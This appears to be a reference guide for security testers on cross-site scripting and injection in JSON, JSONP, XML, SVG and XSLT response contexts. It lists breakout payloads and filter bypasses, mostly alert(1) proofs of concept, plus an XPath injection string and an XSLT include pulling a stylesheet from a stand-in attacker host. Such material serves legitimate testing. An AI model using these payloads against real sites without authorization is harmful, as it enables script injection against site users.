# Special Contexts: JSON, XML, XSLT

## ⚠️ How to Use This File

**Consult this file when:**
- Response Content-Type is `application/json`, `text/xml`, or similar
- Input reflects in JSON, XML, or XSLT structure
- Standard HTML context breakout doesn't apply

**Key principle:** Context determines everything. JSON rendered as HTML is different from JSON parsed by JavaScript.

---

## JSON Responses

### Understanding JSON Context

When input reflects in a JSON response, the exploitability depends on **how the JSON is consumed**:

1. **JSON rendered as HTML** (misconfigured Content-Type) → Direct HTML injection possible
2. **JSON parsed by JavaScript** → Must exploit how parsed data reaches DOM
3. **JSON used in API only** → May not be directly exploitable for XSS

### Step 1: Check Content-Type

Examine the response headers:
- `Content-Type: application/json` → Browser treats as data, not HTML
- `Content-Type: text/html` → Browser renders as HTML (vulnerable!)
- Missing Content-Type → Browser may sniff and render as HTML

### Step 2: Test for HTML Rendering

If Content-Type is wrong or missing, test if HTML is rendered:

```
Input: <img src=x onerror=alert(1)>
```

If alert fires → Direct XSS via JSON response with wrong Content-Type.

### Step 3: Breaking JSON Structure

If you need to break out of JSON to inject HTML:

**Basic JSON:**
```json
{"name": "USER_INPUT", "status": "ok"}
```

**Breakout attempts:**
```
Input: "</script><script>alert(1)</script>
Result: {"name": "\"</script><script>alert(1)</script>", ...}
```

If JSON is embedded in HTML `<script>` tag, closing the script tag works.

**Key characters to test:**
- `"` — Close JSON string
- `}` — Close JSON object
- `]` — Close JSON array  
- `<` — Start HTML tag
- `/` — For closing tags

### Step 4: JSON in Script Tags

Common pattern:
```html
<script>
var data = {"user": "USER_INPUT", "role": "guest"};
</script>
```

**Breakout strategy:**
```
Input: </script><script>alert(1)</script>
```

The `</script>` closes the original script block, then our script executes.

**If `</script>` is filtered:**
```
Input: </script ><script>alert(1)</script>
Input: </ScRiPt><script>alert(1)</script>
Input: </script%0a><script>alert(1)</script>
```

### Step 5: JSONP Endpoints

JSONP wraps JSON in a callback function:
```
URL: /api/data?callback=handleData
Response: handleData({"user": "test"});
```

**If callback is controllable:**
```
URL: /api/data?callback=alert(1)//
Response: alert(1)//({"user": "test"});
```

**Exploit variations:**
```
callback=alert(1)//
callback=alert(1);foo
callback=alert`1`//
```

---

## XML Responses

### Understanding XML Context

XML has stricter parsing than HTML. Invalid XML may not render at all.

### Step 1: Check Content-Type and Rendering

- `Content-Type: application/xml` or `text/xml` → Rendered as XML
- Check if browser displays XML tree or renders content

### Step 2: Test Character Handling

XML has its own entity encoding:
- `<` → `&lt;`
- `>` → `&gt;`
- `&` → `&amp;`
- `"` → `&quot;`
- `'` → `&apos;`

Test each character individually to see what's encoded vs allowed.

### Step 3: CDATA Section Breakout

CDATA sections contain unescaped content:
```xml
<data><![CDATA[USER_INPUT]]></data>
```

**Breakout:**
```
Input: ]]><script>alert(1)</script><![CDATA[
Result: <data><![CDATA[]]><script>alert(1)</script><![CDATA[]]></data>
```

The `]]>` closes CDATA, allowing HTML/script injection.

### Step 4: XML Namespace Injection

If in an XML context, can sometimes use XHTML namespace:
```xml
<root xmlns:xhtml="http://www.w3.org/1999/xhtml">
  <xhtml:script>alert(1)</xhtml:script>
</root>
```

### Step 5: SVG Context

SVG is XML-based and supports scripting:
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(1)</script>
</svg>
```

Or with event handlers:
```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">
</svg>
```

---

## XSLT Context

### Understanding XSLT

XSLT transforms XML documents. If user input reaches XSLT:
- Can potentially inject XSLT elements
- Can inject XPath expressions
- Can access server-side resources in some cases

### Step 1: Identify XSLT Processing

Signs of XSLT:
- Response transforms XML to HTML
- Server-side XSLT processors (Xalan, Saxon, libxslt)
- `<?xml-stylesheet?>` processing instructions

### Step 2: XPath Injection

If input is used in XPath expressions:
```xml
<xsl:value-of select="//user[@name='USER_INPUT']"/>
```

**Injection:**
```
Input: ']|//*|/x[@y='
Result: //user[@name='']|//*|/x[@y='']
```

This modifies the XPath query logic.

### Step 3: XSLT Element Injection

If you can inject XSLT elements:
```xml
<xsl:script>alert(1)</xsl:script>
```

Or include external resources:
```xml
<xsl:include href="http://attacker.com/evil.xsl"/>
```

### Step 4: JavaScript in XSLT

Some XSLT processors support JavaScript:
```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
                xmlns:msxsl="urn:schemas-microsoft-com:xslt"
                xmlns:user="http://example.com">
  <msxsl:script language="JavaScript" implements-prefix="user">
    function attack() { return alert(1); }
  </msxsl:script>
</xsl:stylesheet>
```

---

## Multiple Reflections

### Same Input, Multiple Locations

When input reflects in multiple places:

```html
<!-- Location A: HTML body -->
<h1>Search: USER_INPUT</h1>

<!-- Location B: JavaScript string -->
<script>var term = "USER_INPUT";</script>

<!-- Location C: HTML attribute -->
<input value="USER_INPUT">
```

### Strategy 1: Attack Easiest Context

If Location A allows `<>` but Location B escapes quotes:
- Focus on Location A
- Ignore Location B

### Strategy 2: Cross-Location Attack

Sometimes you can use one location to break another:

```
Input: </script><script>alert(1)</script>
```

Location A might show: `Search: </script><script>alert(1)</script>`
Location B becomes: `<script>var term = "</script><script>alert(1)</script>";</script>`

The `</script>` in Location B closes the script tag prematurely!

### Strategy 3: Different Payloads for Different Contexts

If application allows different chars in different locations:
- Map character filtering for EACH location
- Build payload that works in at least one
- Sometimes combined payload works everywhere

### Analysis Approach

1. Test each location independently first
2. Note different filtering behaviors
3. Identify which context is most permissive
4. Consider if breaking one helps break another
5. Build payload targeting the weakest point

---

## Content-Type Exploitation

### Missing Content-Type

If response has no Content-Type header:
- Browsers perform MIME sniffing
- May render as HTML if content looks like HTML
- Test direct HTML injection

### Content-Type Override Attempts

Some applications allow Content-Type control:
```
/api/data?format=html
/api/data.html
Accept: text/html header influence
```

### X-Content-Type-Options

If `X-Content-Type-Options: nosniff` is set:
- Browser won't sniff MIME type
- Must respect declared Content-Type
- Reduces JSON/XML rendered as HTML risk

---

## Quick Reference: Context-Specific Payloads

| Context | Primary Payload | Notes |
|---------|-----------------|-------|
| JSON in `<script>` | `</script><script>alert(1)</script>` | Close script tag |
| JSON with wrong Content-Type | `<img src=x onerror=alert(1)>` | Direct HTML |
| JSONP callback | `alert(1)//` | If callback controllable |
| XML CDATA | `]]><script>alert(1)</script><![CDATA[` | Close CDATA |
| SVG | `<script>alert(1)</script>` or `onload=alert(1)` | XML with scripting |
| XSLT | XPath injection or element injection | Context-dependent |
